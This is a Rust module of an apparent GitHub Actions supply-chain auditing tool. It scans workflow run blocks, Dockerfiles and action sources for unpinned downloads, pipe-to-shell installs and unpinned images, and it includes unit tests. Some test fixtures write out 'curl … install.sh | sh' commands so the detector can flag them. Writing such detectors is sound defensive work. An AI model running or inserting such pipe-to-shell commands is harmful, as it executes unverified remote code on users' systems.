use anyhow::{Context, Result};
use serde_norway::Value;
use std::collections::HashSet;
use std::path::Path;
use std::process::ExitCode;
use std::sync::LazyLock;

use crate::audit_patterns::{
    self, DOCKER_PATTERNS, DOCKER_URL_PATTERNS, JS_PATTERNS, JS_URL_PATTERNS,
    PS_INSTALL_MODULE_UNVERSIONED, PY_PATTERNS, PY_URL_PATTERNS, Pattern,
    SH_CARGO_INSTALL_UNVERSIONED, SH_GEM_INSTALL_UNVERSIONED, SH_GH_RELEASE_LATEST, SH_GIT_CLONE,
    SH_NPM_UNVERSIONED, SH_NPX_UNVERSIONED, SH_PIP_GIT_URL_UNVERSIONED, SH_PIP_UNVERSIONED,
    SH_PIPX_UNVERSIONED, SH_UV_TOOL_INSTALL_UNVERSIONED, SH_UVX_UNVERSIONED, SHELL_PATTERNS,
    SHELL_PIPE_PATTERNS, SHELL_URL_PATTERNS, cargo_install_has_version, extract_urls,
    gem_install_has_version, gh_release_has_tag, git_clone_has_pinned_ref, npm_install_has_version,
    npx_has_version, pip_git_url_has_ref, pip_install_has_version, pipx_install_has_version,
    ps_install_has_required_version, url_has_version, uv_tool_install_has_version, uvx_has_version,
};
use crate::audit_shell::{
    checksum_verifies_target, docker_unpinned_images, fetch_output_targets,
    git_clone_has_bound_sha_checkout, is_shell_comment_line, join_continuations, url_piped_to_jq,
};
use crate::audit_source::{
    ActionScanStatus, remote_action_scan_key, scan_action_source, scan_local_action_source,
    short_sha,
};
use crate::audited_actions::{AuditSource, AuditedActions};
use crate::auth;
use crate::config::Config;
use crate::github::GitHubClient;
use crate::output::{AuditFinding, AuditMatch, AuditReport};
use crate::workflow;
use colored::Colorize;
use regex::Regex;

/// Reason string for matches allowed via the `trusted-hosts` config list.
/// Shared between the allow site and the repo-config notice that counts them.
pub(crate) const REASON_TRUSTED_HOST: &str = "trusted host";
/// Reason string for matches allowed via `extra-data-formats` config entries.
pub(crate) const REASON_EXTRA_DATA_FORMAT: &str = "extra data format URL";

struct PkgRule {
    regex: &'static LazyLock<Regex>,
    is_pinned: fn(&str) -> bool,
    description: &'static str,
    severity: audit_patterns::Severity,
}

static PKG_RULES: &[PkgRule] = &[
    PkgRule {
        regex: &SH_PIP_UNVERSIONED,
        is_pinned: pip_install_has_version,
        description: "pip install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_NPM_UNVERSIONED,
        is_pinned: npm_install_has_version,
        description: "npm install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_CARGO_INSTALL_UNVERSIONED,
        is_pinned: cargo_install_has_version,
        description: "cargo install without --version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_GEM_INSTALL_UNVERSIONED,
        is_pinned: gem_install_has_version,
        description: "gem install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_NPX_UNVERSIONED,
        is_pinned: npx_has_version,
        description: "npx without version pin — fetches and executes latest on every run",
        severity: audit_patterns::Severity::Medium,
    },
    PkgRule {
        regex: &SH_PIPX_UNVERSIONED,
        is_pinned: pipx_install_has_version,
        description: "pipx install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_UV_TOOL_INSTALL_UNVERSIONED,
        is_pinned: uv_tool_install_has_version,
        description: "uv tool install without version pin",
        severity: audit_patterns::Severity::Low,
    },
    PkgRule {
        regex: &SH_UVX_UNVERSIONED,
        is_pinned: uvx_has_version,
        description: "uvx without version pin — fetches and executes latest on every run",
        severity: audit_patterns::Severity::Medium,
    },
    PkgRule {
        regex: &PS_INSTALL_MODULE_UNVERSIONED,
        is_pinned: ps_install_has_required_version,
        description: "PowerShell Install-Module/Install-Script without -RequiredVersion",
        severity: audit_patterns::Severity::Medium,
    },
    PkgRule {
        regex: &SH_PIP_GIT_URL_UNVERSIONED,
        is_pinned: pip_git_url_has_ref,
        description: "pip install git+URL without @<ref> — tracks default branch HEAD",
        severity: audit_patterns::Severity::Medium,
    },
];

/// Accumulates findings and (when verbose) allowed matches during a scan.
///
/// `push_allowed` is a no-op when `verbose` is false, so callers can record
/// matches unconditionally without caring about the flag.
pub struct AuditCollector {
    pub findings: Vec<AuditFinding>,
    pub allowed: Vec<AuditMatch>,
    pub verbose: bool,
    /// Matches allowed via `trusted-hosts` — counted regardless of verbosity
    /// so the repo-config notice doesn't depend on `--verbose`.
    pub trusted_host_allowed: usize,
    /// Matches allowed via `extra-data-formats` — counted regardless of
    /// verbosity so repo-config notices surface score shaping.
    pub extra_data_format_allowed: usize,
}

impl AuditCollector {
    pub fn new(verbose: bool) -> Self {
        Self {
            findings: Vec::new(),
            allowed: Vec::new(),
            verbose,
            trusted_host_allowed: 0,
            extra_data_format_allowed: 0,
        }
    }

    pub fn push_finding(&mut self, finding: AuditFinding) {
        self.findings.push(finding);
    }

    pub fn push_allowed(&mut self, allowed: AuditMatch) {
        if allowed.reason == REASON_TRUSTED_HOST {
            self.trusted_host_allowed += 1;
        }
        if allowed.reason == REASON_EXTRA_DATA_FORMAT {
            self.extra_data_format_allowed += 1;
        }
        if self.verbose {
            self.allowed.push(allowed);
        }
    }
}

pub async fn run(
    repo_root: &Path,
    json: bool,
    sarif: bool,
    verbose: bool,
    config: &Config,
) -> Result<ExitCode> {
    // Machine-readable formats must keep stdout clean.
    let quiet = json || sarif;

    let token = auth::resolve_token().await;
    let client = token.as_ref().map(|t| GitHubClient::new(t.clone()));
    let had_token = client.is_some();

    let files = workflow::find_workflows(repo_root)?;
    let mut collector = AuditCollector::new(verbose);
    let mut scanned_actions: HashSet<String> = HashSet::new();
    let mut audited = AuditedActions::new(config.fetch_remote);
    let mut audited_bundled = 0usize;
    let mut audited_local_cache = 0usize;
    let mut audited_remote = 0usize;
    let mut scanned_fresh = 0usize;
    let mut scanned_unpinned_branch = 0usize;
    let mut scanned_unpinned_sliding = 0usize;
    let mut ignored = 0usize;

    for file in &files {
        let display_name = workflow::display_path(file.path(), repo_root);
        if !quiet {
            eprintln!("Scanning {display_name}");
        }

        let content = match workflow::read_workflow(file) {
            Ok(content) => content,
            Err(e) if workflow::is_unsafe_workflow_path(&e) => return Err(e),
            Err(e) => {
                // One unreadable/non-UTF-8 workflow shouldn't abort the scan.
                eprintln!("  {} {display_name}: {e}", "skipped".yellow());
                continue;
            }
        };

        match extract_run_blocks(file.path(), &content) {
            Ok(run_blocks) => {
                for (line_offset, run_content) in &run_blocks {
                    scan_shell_content(
                        run_content,
                        &display_name,
                        *line_offset,
                        "",
                        &mut collector,
                        config,
                    );
                }
            }
            Err(e) => {
                // Unparsable YAML shouldn't sink the scan; the `uses:` regex
                // scan below still runs.
                eprintln!(
                    "  {} run-block scan of {display_name}: {e}",
                    "skipped".yellow()
                );
            }
        }

        for action in workflow::scan_local_actions(&content) {
            let key = format!("local:{}", action.path);
            if !scanned_actions.insert(key) {
                continue;
            }

            if !quiet {
                eprintln!("  {} {}", "Scanning local".blue(), action.path);
            }

            let findings_before = collector.findings.len();
            match scan_local_action_source(repo_root, &action, &mut collector, config) {
                Ok(ActionScanStatus::Complete) => {}
                Ok(ActionScanStatus::Incomplete) => {
                    eprintln!("warning: incomplete scan of local action {}", action.path);
                }
                Err(e) => {
                    eprintln!("warning: could not scan local action {}: {e}", action.path);
                }
            }
            for finding in collector.findings.iter_mut().skip(findings_before) {
                finding.workflow_file = Some(display_name.clone());
                finding.workflow_line = Some(action.line_number);
            }
        }

        if let Some(client) = &client {
            let actions = workflow::scan_content(&content);
            for action in &actions {
                let key = remote_action_scan_key(action);
                if !scanned_actions.insert(key) {
                    continue;
                }

                if config.is_action_ignored(&action.owner_repo()) {
                    ignored += 1;
                    if !quiet {
                        eprintln!(
                            "  {}@{} {}",
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "ignored".dimmed()
                        );
                    }
                    continue;
                }

                if let Some(source) = audited
                    .check(
                        &action.owner,
                        &action.repo,
                        action.subpath.as_deref(),
                        &action.ref_string,
                    )
                    .await
                {
                    match source {
                        AuditSource::Bundled => audited_bundled += 1,
                        AuditSource::LocalCache => audited_local_cache += 1,
                        AuditSource::Remote => audited_remote += 1,
                    }
                    if !quiet {
                        eprintln!(
                            "  {}@{} {} ({})",
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "audited".green(),
                            source.label()
                        );
                    }
                    continue;
                }

                let pinned = matches!(
                    action.ref_type,
                    workflow::RefType::Sha | workflow::RefType::Tag
                );

                if !quiet {
                    if pinned {
                        eprintln!(
                            "  {} {}@{}",
                            "Fetching".blue(),
                            action.full_name(),
                            short_sha(&action.ref_string)
                        );
                    } else {
                        eprintln!(
                            "  {} {}@{} {}",
                            "Fetching".blue(),
                            action.full_name(),
                            short_sha(&action.ref_string),
                            "(unpinned)".yellow()
                        );
                    }
                }

                let findings_before = collector.findings.len();
                match scan_action_source(client, action, &mut collector, config).await {
                    Ok(scan_status) => {
                        if scan_status == ActionScanStatus::Complete {
                            match action.ref_type {
                                workflow::RefType::Sha | workflow::RefType::Tag => {
                                    scanned_fresh += 1;
                                }
                                workflow::RefType::SlidingTag => {
                                    scanned_unpinned_sliding += 1;
                                }
                                workflow::RefType::Branch => {
                                    scanned_unpinned_branch += 1;
                                }
                            }
                        } else {
                            eprintln!(
                                "warning: incomplete scan of {}; clean verdict not cached",
                                action.full_name()
                            );
                        }
                        // Anchor remote-scan findings to the loading `uses:` line
                        // so SARIF results land inside the scanning repo.
                        for finding in collector.findings.iter_mut().skip(findings_before) {
                            finding.workflow_file = Some(display_name.clone());
                            finding.workflow_line = Some(action.line_number);
                        }
                        // Only cache clean verdicts for SHA refs — tag and branch
                        // contents can move after the verdict.
                        if scan_status == ActionScanStatus::Complete
                            && collector.findings.len() == findings_before
                            && action.ref_type == workflow::RefType::Sha
                        {
                            let tag = action.tag_comment.as_deref().unwrap_or(&action.ref_string);
                            audited.cache_clean(
                                &action.owner,
                                &action.repo,
                                action.subpath.as_deref(),
                                &action.ref_string,
                                tag,
                            );
                        }
                    }
                    Err(e) => {
                        eprintln!("warning: could not scan {}: {e}", action.full_name());
                    }
                }
            }
        }
    }

    if !quiet && !files.is_empty() {
        eprintln!();
    }

    let before_filters = collector.findings.len();
    collector.findings.retain(|f| {
        config.meets_severity(&f.severity) && !config.is_pattern_ignored(&f.description)
    });
    let suppressed = before_filters - collector.findings.len();

    // When auditing a repo you don't control, its own .pinprick.toml must not
    // silently set audit policy — say what it changed and how to opt out.
    if config.is_repo_local() {
        let trusted_host_allowed = collector.trusted_host_allowed;
        let mut parts = Vec::new();
        if suppressed > 0 {
            parts.push(format!("findings suppressed: {suppressed}"));
        }
        if ignored > 0 {
            parts.push(format!("actions skipped: {ignored}"));
        }
        if trusted_host_allowed > 0 {
            parts.push(format!("trusted-host fetches: {trusted_host_allowed}"));
        }
        if collector.extra_data_format_allowed > 0 {
            parts.push(format!(
                "extra-data-format fetches: {}",
                collector.extra_data_format_allowed
            ));
        }
        if !parts.is_empty() {
            eprintln!(
                "note: the scanned repo's .pinprick.toml affected results ({}) — rerun with --no-repo-config to ignore it",
                parts.join(", ")
            );
        }
    }

    collector
        .findings
        .sort_by_key(|f| match f.severity.as_str() {
            "high" => 0,
            "medium" => 1,
            _ => 2,
        });

    let has_findings = !collector.findings.is_empty();
    let report = AuditReport {
        actions_scanned: scanned_actions.len(),
        findings: collector.findings,
        allowed: collector.allowed,
        had_token,
        audited_bundled,
        audited_local_cache,
        audited_remote,
        scanned_fresh,
        scanned_unpinned_branch,
        scanned_unpinned_sliding,
        ignored,
    };

    if sarif {
        report.print_sarif();
    } else if json {
        report.print_json();
    } else {
        report.print_human(verbose);
    }

    if has_findings {
        Ok(ExitCode::from(1))
    } else {
        Ok(ExitCode::SUCCESS)
    }
}

pub fn extract_run_blocks(path: &Path, content: &str) -> Result<Vec<(usize, String)>> {
    let yaml: Value =
        serde_norway::from_str(content).with_context(|| format!("parsing {}", path.display()))?;

    let mut blocks = Vec::new();
    let mut cursor: usize = 0; // 0-based line index, monotonically advancing

    // Walk jobs.*.steps[].run, including nested parallel groups.
    // serde_norway's Mapping preserves insertion order, so iterating here
    // visits `run:` blocks in document order and we can anchor each one at
    // the next matching line, never earlier ones.
    if let Some(jobs) = yaml.get("jobs").and_then(|j| j.as_mapping()) {
        for (_job_name, job) in jobs {
            if let Some(steps) = job.get("steps") {
                for run in collect_step_run_blocks(steps) {
                    let (line, next_cursor) = find_run_line(content, run, cursor);
                    cursor = next_cursor;
                    // Line 0 (not found) is kept — the block is still
                    // scanned, just unanchored.
                    blocks.push((line, run.to_string()));
                }
            }
        }
    }

    Ok(blocks)
}

/// Collect the `run:` block bodies under a `steps:` sequence in document
/// order, descending into `parallel:` groups.
///
/// GitHub documents `parallel:` as a sequence of steps, so a nested group is
/// walked exactly like the top-level `steps:` list — which also covers
/// `parallel:` nested inside `parallel:`. A `background: true` step keeps its
/// own `run:` key and is collected like any other step. Steps without a `run:`
/// (`uses:`, `wait:`, `cancel:`) contribute nothing.
pub(crate) fn collect_step_run_blocks(steps: &Value) -> Vec<&str> {
    fn collect<'a>(steps: &'a Value, runs: &mut Vec<&'a str>) {
        let Some(sequence) = steps.as_sequence() else {
            return;
        };

        for step in sequence {
            let Some(mapping) = step.as_mapping() else {
                continue;
            };
            for (key, value) in mapping {
                match key.as_str() {
                    Some("run") => {
                        if let Some(run) = value.as_str() {
                            runs.push(run);
                        }
                    }
                    Some("parallel") => collect(value, runs),
                    _ => {}
                }
            }
        }
    }

    let mut runs = Vec::new();
    collect(steps, &mut runs);
    runs
}

/// Locate the 1-based line of `run_content` in the raw file, starting the
/// search at `start` (0-based). Returns the line and the cursor to start the
/// next search at. A zero line means "not found"; the cursor is preserved.
///
/// Prefers an exact trimmed-line match so `echo hello` does not steal the
/// position of a longer line like `    echo hello world` that appears first.
/// Falls back to `contains` if no exact match is found past the cursor, which
/// preserves the prior behavior for run blocks that serde_norway normalized.
fn find_run_line(file_content: &str, run_content: &str, start: usize) -> (usize, usize) {
    let Some(first_line) = run_content.lines().next() else {
        return (0, start);
    };
    let trimmed = first_line.trim();
    if trimmed.is_empty() {
        return (0, start);
    }
    let mut contains_hit: Option<usize> = None;
    for (i, line) in file_content.lines().enumerate().skip(start) {
        if line.trim() == trimmed {
            return (i + 1, i + 1);
        }
        if contains_hit.is_none() && line.contains(trimmed) {
            contains_hit = Some(i);
        }
    }
    match contains_hit {
        Some(i) => (i + 1, i + 1),
        None => (0, start),
    }
}

pub fn scan_shell_content(
    content: &str,
    source_file: &str,
    base_line: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // All passes scan logical lines — a command split across physical lines
    // with trailing backslashes is one shell command, and scanning the pieces
    // separately would let `curl … \` + `<url>` evade every two-part pattern.
    let logical = join_continuations(content);

    // Pipe-to-shell pass runs first so its findings land before `findings_before`
    // and escape the checksum downgrade loop below.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, joined) in &logical {
        if is_shell_comment_line(joined) {
            continue;
        }
        let line_num = base_line + start;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            joined,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    let findings_before = collector.findings.len();

    for (li, (start, line)) in logical.iter().enumerate() {
        let line = line.as_str();
        if is_shell_comment_line(line) {
            continue;
        }
        let line_num = base_line + start;
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }

        let before = collector.findings.len();
        check_patterns(
            &SHELL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        let shell_matched = collector.findings.len() > before;

        // A `/latest/` URL already triggers the high-severity SH_*_LATEST rule
        // in SHELL_PATTERNS. Running SHELL_URL_PATTERNS on the same line would
        // re-flag it as a medium unversioned URL — duplicate noise.
        if !shell_matched {
            check_url_patterns(
                &SHELL_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }

        if SH_GH_RELEASE_LATEST.is_match(line) && !gh_release_has_tag(line) {
            collector.push_finding(AuditFinding::new(
                &audit_patterns::Severity::Medium,
                &audit_patterns::Category::ShellFetch,
                action_name,
                source_file,
                line_num,
                line,
                "gh release download without pinned version",
            ));
        }

        for image in docker_unpinned_images(line) {
            collector.push_finding(AuditFinding::new(
                &audit_patterns::Severity::High,
                &audit_patterns::Category::DockerUnpinned,
                action_name,
                source_file,
                line_num,
                line,
                format!("docker pull/run uses unpinned image `{image}`"),
            ));
        }

        if fetches_non_literal_executable(line, config) {
            collector.push_finding(AuditFinding::new(
                &audit_patterns::Severity::Low,
                &audit_patterns::Category::ShellFetch,
                action_name,
                source_file,
                line_num,
                line,
                "curl/wget downloads executable from non-literal source — cannot verify URL version",
            ));
        }

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            if git_clone_has_bound_sha_checkout(&logical, li) {
                collector.push_allowed(AuditMatch::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::ShellFetch,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "followed by SHA checkout",
                ));
            } else {
                collector.push_finding(AuditFinding::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::ShellFetch,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "git clone without pinned ref — clones HEAD of default branch",
                ));
            }
        }

        for rule in PKG_RULES {
            if rule.regex.is_match(line) && !(rule.is_pinned)(line) {
                push_pkg_finding(rule, line, source_file, line_num, action_name, collector);
            }
        }
    }

    // Suppress findings immediately followed by checksum verification: a
    // sha256sum / gpg --verify check deterministically detects a tampered
    // download, so the fetch is mitigated, not merely less severe. Recorded as
    // an allowed match (visible under --verbose), mirroring the SHA-checkout
    // suppression above. Pipe-shell findings sit below `findings_before` and are
    // exempt — the piped payload is never written to disk for a checksum to
    // verify. Offset 0 covers a one-liner `curl -o f … && sha256sum -c …`.
    let mut idx = findings_before;
    while idx < collector.findings.len() {
        let verified = collector.findings[idx].line.is_some_and(|finding_line| {
            let rel = finding_line.saturating_sub(base_line);
            logical
                .iter()
                .position(|(start, _)| *start == rel)
                .is_some_and(|li| {
                    let targets = fetch_output_targets(&collector.findings[idx].pattern_matched);
                    !targets.is_empty()
                        && targets.iter().all(|target| {
                            (0..=3).any(|offset| {
                                li + offset < logical.len()
                                    && checksum_verifies_target(&logical[li + offset].1, target)
                            })
                        })
                })
        });
        if verified {
            let finding = collector.findings.remove(idx);
            collector.push_allowed(AuditMatch::from_finding(
                finding,
                "followed by checksum verification",
            ));
        } else {
            idx += 1;
        }
    }
}

/// Lines longer than this are treated as minified and split on `;` before scanning.
const MINIFIED_LINE_THRESHOLD: usize = 500;

pub(crate) fn scan_js_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;

        if line.len() > MINIFIED_LINE_THRESHOLD {
            for segment in line.split(';') {
                let segment = segment.trim();
                if segment.is_empty() {
                    continue;
                }
                check_patterns(
                    &JS_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                );
                check_url_patterns(
                    &JS_URL_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                    config,
                );
            }
        } else {
            check_patterns(
                &JS_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
            check_url_patterns(
                &JS_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }
    }
}

pub(crate) fn scan_py_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;

        check_patterns(
            &PY_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        check_url_patterns(
            &PY_URL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );
    }
}

pub(crate) fn scan_dockerfile_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // Dockerfile RUN instructions lean heavily on trailing-backslash
    // continuations; scan logical lines so a fetch split across physical
    // lines is still seen whole.
    let logical = join_continuations(content);

    // Multi-stage builds name stages via `FROM … AS <name>`. Collect those
    // names so a later `FROM <name>` is recognized as a stage reference, not an
    // image pull — otherwise it false-positives as an untagged image.
    let stage_names: HashSet<String> = logical
        .iter()
        .filter_map(|(_, line)| audit_patterns::dockerfile_stage_alias(line))
        .collect();

    // Escalate `RUN curl ... | sh` from medium (DOCKER_RUN_CURL) to high.
    let mut pipe_shell_lines: HashSet<usize> = HashSet::new();
    for (start, line) in &logical {
        let line_num = start + 1;
        let before = collector.findings.len();
        check_patterns(
            &SHELL_PIPE_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );
        if collector.findings.len() > before {
            pipe_shell_lines.insert(line_num);
        }
    }

    for (li, (start, line)) in logical.iter().enumerate() {
        let line = line.as_str();
        let line_num = start + 1;

        if audit_patterns::DOCKER_FROM_DIGEST.is_match(line) {
            continue;
        }
        if pipe_shell_lines.contains(&line_num) {
            continue;
        }
        // `FROM <stage>` (an earlier build stage) and `FROM scratch` (the empty
        // base) are not unpinned image pulls — there's nothing to pin.
        if let Some(base) = audit_patterns::dockerfile_from_base(line)
            && (base == "scratch" || stage_names.contains(&base))
        {
            continue;
        }

        check_patterns(
            &DOCKER_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
        );

        check_url_patterns(
            &DOCKER_URL_PATTERNS,
            line,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            if git_clone_has_bound_sha_checkout(&logical, li) {
                collector.push_allowed(AuditMatch::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::DockerUnpinned,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "followed by SHA checkout",
                ));
            } else {
                collector.push_finding(AuditFinding::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::DockerUnpinned,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "git clone in Dockerfile without pinned ref",
                ));
            }
        }
    }
}

fn fetches_non_literal_executable(line: &str, config: &Config) -> bool {
    if extract_urls(line).next().is_some() || !line.contains('$') {
        return false;
    }
    fetch_output_targets(line).into_iter().any(|target| {
        !target.contains('$') && target != "/dev/null" && !config.is_data_format_exempt(&target)
    })
}

fn push_pkg_finding(
    rule: &PkgRule,
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    collector.push_finding(AuditFinding::new(
        &rule.severity,
        &audit_patterns::Category::ShellFetch,
        action_name,
        source_file,
        line_num,
        line,
        rule.description,
    ));
}

fn check_url_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    // The URL classification below is line-level, so every matching pattern
    // would reach the identical verdict on the identical URL set: record once
    // for the first match instead of once per pattern (`curl … && wget …`
    // previously emitted two findings for the same line).
    let Some(pattern) = patterns.iter().find(|p| p.regex.is_match(line)) else {
        return;
    };

    // Check EVERY URL, not just the first: a versioned/trusted decoy before
    // the real fetch must not suppress the finding. Allowed only if all URLs
    // are exempt; any unexempt one is a finding.
    let mut allowed_reason: Option<&str> = None;
    let mut dangerous = false;
    for url in extract_urls(line) {
        if url_has_version(url) {
            allowed_reason.get_or_insert("versioned URL");
        } else if config.is_host_trusted(url) {
            allowed_reason.get_or_insert(REASON_TRUSTED_HOST);
        } else if config.is_extra_data_format_exempt(url) {
            allowed_reason.get_or_insert(REASON_EXTRA_DATA_FORMAT);
        } else if config.is_data_format_exempt(url) {
            allowed_reason.get_or_insert("data format URL");
        } else if url_piped_to_jq(line, url) {
            allowed_reason.get_or_insert("piped to jq");
        } else {
            dangerous = true;
            break;
        }
    }

    if dangerous {
        if let Some(reason) = allowed_reason {
            collector.push_allowed(AuditMatch::from_pattern(
                pattern,
                action_name,
                source_file,
                line_num,
                line,
                reason,
            ));
        }
        collector.push_finding(AuditFinding::from_pattern(
            pattern,
            action_name,
            source_file,
            line_num,
            line,
        ));
    } else if let Some(reason) = allowed_reason {
        collector.push_allowed(AuditMatch::from_pattern(
            pattern,
            action_name,
            source_file,
            line_num,
            line,
            reason,
        ));
    }
    // No URL on the line: nothing to record.
}

fn check_patterns(
    patterns: &[Pattern],
    line: &str,
    source_file: &str,
    line_num: usize,
    action_name: &str,
    collector: &mut AuditCollector,
) {
    for pattern in patterns {
        if pattern.regex.is_match(line) {
            collector.push_finding(AuditFinding::from_pattern(
                pattern,
                action_name,
                source_file,
                line_num,
                line,
            ));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::LazyLock;

    static DEFAULT_CONFIG: LazyLock<Config> = LazyLock::new(Config::default);

    #[test]
    fn collector_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        c.push_allowed(AuditMatch::new(
            &audit_patterns::Severity::Medium,
            &audit_patterns::Category::ShellFetch,
            "",
            "test",
            1,
            "curl https://example.com/v1.2.3/foo",
            "versioned URL",
        ));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn collector_keeps_allowed_when_verbose() {
        let mut c = AuditCollector::new(true);
        c.push_allowed(AuditMatch::new(
            &audit_patterns::Severity::Medium,
            &audit_patterns::Category::ShellFetch,
            "",
            "test",
            1,
            "curl https://example.com/v1.2.3/foo",
            "versioned URL",
        ));
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn find_run_line_advances_past_earlier_match() {
        // Two `run:` blocks both start with `echo hello`. The second one must
        // map to its own line, not the first occurrence, so checksum-suppression
        // windows and SARIF locations stay anchored correctly.
        let yaml = "\
jobs:
  a:
    steps:
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
      - run: |
          echo hello
          curl https://example.com/install.sh | sh
";
        let (first, cursor) = find_run_line(yaml, "echo hello\n          curl ...", 0);
        assert_eq!(first, 5, "first block should anchor at line 5");
        let (second, _) = find_run_line(yaml, "echo hello\n          curl ...", cursor);
        assert_eq!(
            second, 8,
            "second block must skip the first block's first-line match"
        );
    }

    #[test]
    fn find_run_line_empty_run_content() {
        let (line, cursor) = find_run_line("foo\nbar\n", "", 0);
        assert_eq!((line, cursor), (0, 0));
    }

    #[test]
    fn find_run_line_no_match_preserves_cursor() {
        let (line, cursor) = find_run_line("foo\nbar\n", "baz", 1);
        assert_eq!((line, cursor), (0, 1));
    }

    #[test]
    fn find_run_line_prefers_exact_trimmed_match() {
        // A longer line that `contains` the target shouldn't steal the
        // anchor from the actual run block's first line further down.
        let file = "\
prefix echo hello world
    echo hello
more stuff
";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (2, 2));
    }

    #[test]
    fn find_run_line_falls_back_to_contains() {
        // No exact trimmed match exists, so `contains` still anchors.
        let file = "echo hello world\nother\n";
        let (line, cursor) = find_run_line(file, "echo hello", 0);
        assert_eq!((line, cursor), (1, 1));
    }

    #[test]
    fn extract_run_blocks_recurses_into_parallel_steps() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo outside
      - parallel:
          - run: echo nested one
          - name: Nested two
            run: |
              echo nested two
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let runs = blocks.iter().map(|(_, run)| run.trim()).collect::<Vec<_>>();

        assert_eq!(
            runs,
            vec!["echo outside", "echo nested one", "echo nested two"]
        );
    }

    #[test]
    fn extract_run_blocks_anchors_nested_parallel_blocks_in_document_order() {
        let yaml = "\
jobs:
  test:
    steps:
      - run: |
          echo shared
          echo first
      - parallel:
          - run: |
              echo shared
              echo nested
      - run: |
          echo shared
          echo third
";
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let lines = blocks.iter().map(|(line, _run)| *line).collect::<Vec<_>>();

        assert_eq!(lines, vec![5, 9, 12]);
    }

    #[test]
    fn scan_shell_content_flags_parallel_pipe_to_shell() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - run: curl https://example.com/install.sh | sh
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in blocks {
            scan_shell_content(&run, "workflow.yml", line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn parallel_control_steps_do_not_create_spurious_findings() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - wait: server
      - parallel:
          - wait: server
          - cancel: server
          - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
          - run: echo safe
      - cancel: server
"#;
        let blocks = extract_run_blocks(Path::new("workflow.yml"), yaml).unwrap();
        let mut c = AuditCollector::new(false);

        for (line, run) in &blocks {
            scan_shell_content(run, "workflow.yml", *line, "", &mut c, &DEFAULT_CONFIG);
        }

        assert_eq!(blocks.len(), 1);
        assert_eq!(blocks[0].1.trim(), "echo safe");
        assert!(c.findings.is_empty());
    }

    #[test]
    fn scan_content_finds_uses_inside_parallel_group() {
        let yaml = r#"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - parallel:
          - uses: actions/checkout@v4
"#;
        let refs = workflow::scan_content(yaml);

        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].full_name(), "actions/checkout");
    }

    #[test]
